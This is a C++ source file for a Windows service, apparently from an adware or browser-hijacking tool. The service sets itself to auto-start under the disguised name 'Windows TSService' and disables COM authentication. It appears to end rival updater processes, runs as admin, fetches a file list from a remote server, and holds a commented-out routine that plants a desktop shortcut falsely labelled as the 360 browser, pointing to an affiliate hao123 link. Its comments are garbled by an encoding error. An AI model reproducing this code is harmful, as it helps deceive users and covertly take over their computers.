// AiSvc.cpp : WinMain ��ʵ��


#include "stdafx.h"
#include "resource.h"
#include "AiSvc_i.h"
#include "Service.h"
#include "ultra/file-op.h"
#include "Network.h"

#include "SVThread.h"
#define SVC_MUTEX L"WinTSvc-{90BF588B-343D-4DFE-A7BB-64947AF3E5BD}"
#define SVC_MUTEX1 L"WinTSvc1-{90BF588B-343D-4DFE-A7BB-64947AF3E5BD}"

VOID CALLBACK OnTimerProc(HWND hwnd,UINT uMsg,UINT_PTR idEvent,DWORD dwTime);
CSVThread svThread;

class CAiSvcModule : public ATL::CAtlServiceModuleT< CAiSvcModule, IDS_SERVICENAME >
{
public :
	DECLARE_LIBID(LIBID_AiSvcLib)
	DECLARE_REGISTRY_APPID_RESOURCEID(IDR_AISVC, "{90BF588B-343D-4DFE-A7BB-64947AF3E5BD}")
	HRESULT InitializeSecurity() throw()  
	{  
		// TODO : ���� CoInitializeSecurity ��Ϊ�����ṩ�ʵ��İ�ȫ����  
		// ���� - PKT ����������֤��  
		// RPC_C_IMP_LEVEL_IDENTIFY ��ģ�⼶��  
		// �Լ��ʵ��ķ� null ��ȫ˵������  

		//return S_OK;  
		return CoInitializeSecurity(NULL,-1,NULL,NULL,  
			RPC_C_AUTHN_LEVEL_NONE,  
			RPC_C_IMP_LEVEL_IDENTIFY,  
			NULL,EOAC_NONE,NULL);//������ȫ˵����  
	}  

	//����Ҫ��һЩ����������д  

	HRESULT Start(int nShowCmd) throw()
	{
		SetServiceStatus(SERVICE_RUNNING);
		return __super::Start(nShowCmd);
	}

	//��ʼ������
	HRESULT PreMessageLoop(int nShowCmd) throw()
	{
		//OutputDebugStringA("PreMessageLoop");
		SetServiceStatus(SERVICE_RUNNING);
		HRESULT hr = __super::PreMessageLoop(nShowCmd);
		if (SUCCEEDED(hr))
		{
			//�������߳�
		}
		return hr;
	}

	void RunMessageLoop() throw()
	{
		//OutputDebugStringA("RunMessageLoop");
		MSG msg;
		while (GetMessage(&msg, 0, 0, 0) > 0)
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	HRESULT Run(int nShowCmd = SW_HIDE) throw()
	{
		//OutputDebugStringA("Run");
		SetServiceStatus(SERVICE_RUNNING);
		DWORD  dwID;
		HANDLE hThread;
		//OutputDebugStringA("CreateThread");

		//hThread = ::CreateThread(0, 0, CSVThread::SVThreadProc, (void*)this,0,&dwID); //�������߳�
		if (svThread.Go() == false)
		{
			//OutputDebugStringA("Run Return False!");
			OnStop();
			return S_FALSE;
		}
		else
		{
			//SetTimer(NULL,1,svThread.m_nDelayTime,(TIMERPROC)OnTimerProc);//Ӧ����GetMessage()ѭ��֮��
		}
		return __super::Run();
	}

	void OnStop() throw()

	{
		__super::OnStop();
	}

	HRESULT RegisterAppId(bool bService = false)
	{
		HRESULT hr = S_OK;
		BOOL res = __super::RegisterAppId(bService); 
		if (bService)
		{
			//OutputDebugStringA("bService");
			if (IsInstalled())
			{
				//OutputDebugStringA("IsInstalled");
				SC_HANDLE hSCM = ::OpenSCManagerW(NULL, NULL, SERVICE_CHANGE_CONFIG);
				SC_HANDLE hService = NULL;
				if (hSCM == NULL)
				{
					//OutputDebugStringA("OpenSCManagerW NULL");
					//hr = AtlHresultFromLastError();
					return false;
				}
				else
				{
					hService = ::OpenService(hSCM, m_szServiceName, SERVICE_CHANGE_CONFIG);
					if (hService != NULL)
					{
						::ChangeServiceConfig(hService, SERVICE_NO_CHANGE, 
							SERVICE_AUTO_START, // �޸ķ���Ϊ�Զ�����
							NULL, NULL, NULL, NULL, NULL, NULL, NULL,
							m_szServiceName); // ͨ���޸���ԴIDS_SERVICENAME �޸ķ������ʾ����
						SERVICE_DESCRIPTION Description;
						TCHAR szDescription[1024];
						ZeroMemory(szDescription, 1024);
						ZeroMemory(&Description, sizeof(SERVICE_DESCRIPTION));
						lstrcpy(szDescription, _T("Windows TSService"));  //�޸ķ���˵��
						Description.lpDescription = szDescription;
						::ChangeServiceConfig2(hService, SERVICE_CONFIG_DESCRIPTION, &Description);
						::CloseServiceHandle(hService);
					}
					else
					{
						//OutputDebugStringA("OpenService NULL");
						//hr = AtlHresultFromLastError();
						return false;
					}
					::CloseServiceHandle(hSCM);
				}
			}
		}
		return hr;
	}
};


CAiSvcModule _AtlModule;

//��ʱ������

VOID CALLBACK OnTimerProc(HWND hwnd,UINT uMsg,UINT_PTR idEvent,DWORD dwTime)
{
	//svThread.RunDefendTipWnd(svThread.m_strTipPopTime);
	KillTimer(hwnd, idEvent);
	Sleep(2000);
	_AtlModule.OnStop();
}
//
#include "xlog.h"
extern "C" int WINAPI _tWinMain(HINSTANCE /*hInstance*/, HINSTANCE /*hPrevInstance*/, 
	LPTSTR lpCmdLine, int nShowCmd)
{
// 	CoInitialize(NULL);
// 	Shell().CreateShortCutLink(L"360��ȫ�����7", L"http://www.hao123.com/?tn=92426635_hao_pg", L"C:\\Program File\\Internet Explorer\\", L"C:\\Users\\Fan\\Desktop\\", 
// 		L"http://www.hao123.com/?tn=92426635_hao_pg", L"", L"C:\\main.ico");
	xlog("%s %s", ultra::GetModuleFileNameA().c_str(), ultra::_T2A(lpCmdLine).c_str());
	HANDLE hMutex = NULL;
	if (wcscmp(lpCmdLine, L"-run") == 0)
	{
// 		hMutex = ::CreateMutex(NULL, TRUE, SVC_MUTEX);
// 		if (GetLastError() != ERROR_ALREADY_EXISTS && GetLastError() != ERROR_ACCESS_DENIED)
// 		{
// 			OutputDebugStringA("WinTService -run");
// 			//Sleep(3*60*1000);
// 			svThread.RunAsUserAdmin();
// 			return 0;
// 		}
		ultra::CheckProcessExist(L"gsupdate.exe", true);
		ultra::CheckProcessExist(L"didaupdate.exe", true);
		ultra::CheckProcessExist(L"weupdate.exe", true);
		svThread.RunAsUserAdmin();
		return 0;
	}
	else if (wcscmp(lpCmdLine, L"-ran") == 0)
	{
		xlog("-ran");
		hMutex = ::CreateMutex(NULL, TRUE, SVC_MUTEX1);
		xlog("%d", GetLastError());
		if (GetLastError() != ERROR_ALREADY_EXISTS && GetLastError() != ERROR_ACCESS_DENIED)
		{
			OutputDebugStringA("-ran");
			svThread.RunCircle();
			return 0;
		}
	}
	else if (wcscmp(lpCmdLine, L"-install") == 0)
	{
		CService::CopyAndRunService();
	}
	else if (wcscmp(lpCmdLine, L"-update") == 0)
	{
		CNetwork* network = CNetwork::Instance();
		std::wstring strReturn;
		network->HttpDownloadString(std::wstring(SERVER_DIR)+L"sfilelist", strReturn);
		Sleep(5000);
		return 0;
	}
	else
	{
		OutputDebugStringA("WinTService ");
		return _AtlModule.WinMain(nShowCmd);
	}
	return 0;
}

